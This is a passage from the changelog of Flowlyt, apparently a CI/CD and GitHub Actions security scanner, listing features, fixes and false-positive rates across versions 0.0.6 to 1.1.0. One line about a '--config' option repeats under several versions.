- Enhanced CLI output

[Full Details](changelogs/CHANGELOG-v1.0.5.md)

---

## [1.0.4] - 2025-12-20

### ✨ Added

- **AI-powered false positive detection**
  - OpenAI, Google Gemini, Anthropic Claude, xAI Grok support
  - BYOK (Bring Your Own Key) model
  - Confidence scoring (0-100%)
- **Enterprise policy enforcement**
  - Custom policy rules (PCI-DSS, SOX, NIST)
  - Automated compliance reporting
- **Advanced AST analysis**
  - Call graph analysis
  - Data flow tracking
  - Reachability analysis

### ✨ Added

- `scan --config` / `-c` to point at a configuration file explicitly.

### 🐛 Fixed

- GitLab CI/CD integration issues
- Severity mapping for custom rules
- Permission analysis edge cases

[Full Details](changelogs/CHANGELOG-v1.0.4.md)

---

## [1.0.3] - 2025-12-15

### ✨ Added

- Organization-wide analysis capability
- Bulk repository scanning
- Aggregated security reports
- Top findings across organization

### 🔧 Improved

- Faster scanning for multiple repositories
- Better rate limit handling
- Enhanced reporting formats

[Full Details](changelogs/CHANGELOG-v1.0.3.md)

---

## [1.0.2] - 2025-12-05

### ✨ Added

- Enhanced secret detection (AWS, GCP, Azure)
- Improved entropy-based detection
- Better SARIF output for GitHub Security

### ✨ Added

- `scan --config` / `-c` to point at a configuration file explicitly.

### 🐛 Fixed

- Remote repository cloning (#12)
- Line number mapping in SARIF
- Panic with empty workflow files

### 🔧 Improved

- Faster organization scanning
- Better error messages
- Enhanced progress indicators

[Full Details](changelogs/CHANGELOG-v1.0.2.md)

---

## [1.0.1] - 2025-11-25

### ✨ Added

- Custom rules support
- Advanced configuration options
- Template workflow scanning
- Shell script security analysis

### ✨ Added

- `scan --config` / `-c` to point at a configuration file explicitly.

### 🐛 Fixed

- Multiple parsing edge cases
- Memory leaks in large scans
- Incorrect severity mapping

### 🔧 Improved

- Performance optimization (62% faster)
- Better documentation
- Enhanced error reporting

[Full Details](changelogs/CHANGELOG-v1.0.1.md)

---

## [1.0.0] - 2025-11-15

### 🎉 Major Release

First stable release of Flowlyt!

### ✨ Added

- 85+ security rules covering:
  - Injection attacks
  - Secret exposure
  - Supply chain security
  - Misconfigurations
  - Shell obfuscation
  - Access control
- GitHub Actions workflow scanning
- SARIF output format
- JSON and YAML reporting
- CLI interface
- Configuration file support
- Remote repository scanning

### 📊 Detection Categories

- Malicious patterns
- Injection flaws
- Secrets exposure
- Supply chain vulnerabilities
- Privilege escalation
- Data exfiltration

[Full Details](changelogs/CHANGELOG-v1.0.0.md)

---

## [0.0.9] - 2025-11-01

### ✨ Added

- SARIF output support
- GitHub Security tab integration
- Severity mapping improvements

### ✨ Added

- `scan --config` / `-c` to point at a configuration file explicitly.

### 🐛 Fixed

- Various parsing bugs
- Memory optimization

[Full Details](changelogs/CHANGELOG-v0.0.9.md)

---

## [0.0.8] - 2025-11-01

### ✨ Added

- `scan --config` / `-c` to point at a configuration file explicitly.

### 🐛 Fixed

- YAML parsing for complex workflows
- Network timeout handling
- Shell script analysis false positives

### 🔧 Improved

- Progress reporting
- Memory usage optimization
- CLI output formatting

[Full Details](changelogs/CHANGELOG-v0.0.8.md)

---

## [0.0.7] - 2025-10-15

### ✨ Added

- Initial rule set (50+ rules)
- Basic workflow scanning
- JSON output format

### 🔧 Improved

- Rule accuracy
- Scanning performance

[Full Details](changelogs/CHANGELOG-v0.0.7.md)

---

## [0.0.6] - 2025-10-01

### 🎉 Initial Beta Release

- Basic CI/CD security scanning
- GitHub Actions support
- Command-line interface
- Core security rules

[Full Details](changelogs/CHANGELOG-v0.0.6.md)

---

## Version Comparison

| Version | Key Feature | False Positive Rate |
|---------|-------------|-------------------|
| **1.1.0** | AI Layer Redesign (batch dispatch, class prompts, pre-filter) | **10-15%** ✅ |
| 1.0.11 | Noise reduction (matrix dedup, bot severity, SHELL_SCRIPT_ISSUES) | 10-15% |
| 1.0.10 | False positive wave (REF_CONFUSION, EXTERNAL_TRIGGER_DEBUG, taint engine) | 10-15% |
| 1.0.9 | Expression Taint Analysis + 11 New Rules | 10-15% |
| 1.0.8 | Context-Aware Analysis | 10-15% |
| 1.0.7 | Code Context in Reports | 60-70% |
| 1.0.6 | Internal Action Trust | 60-70% |
| 1.0.5 | Multi-Platform Support | 60-70% |
| 1.0.4 | AI-Powered Detection | 50-60% with AI |
| 1.0.3 | Organization Analysis | 60-70% |
| 1.0.2 | Enhanced Secret Detection | 60-70% |
| 1.0.1 | Custom Rules | 65-75% |
| 1.0.0 | First Stable Release | 70-80% |

## Links

- [GitHub Repository](https://github.com/harekrishnarai/flowlyt)
- [Documentation](docs/README.md)
- [Installation Guide](docs/guides/installation.md)
- [Contributing](CONTRIBUTING.md)
- [Security Policy](SECURITY.md)

## Versioning

We use [Semantic Versioning](https://semver.org/):
- **Major** version for incompatible API changes
- **Minor** version for added functionality in a backward-compatible manner
- **Patch** version for backward-compatible bug fixes

## Support

- 🐛 [Report Issues](https://github.com/harekrishnarai/flowlyt/issues)
- 💬 [GitHub Discussions](https://github.com/harekrishnarai/flowlyt/discussions)
- 📧 [Contact](https://github.com/harekrishnarai/flowlyt#contact)
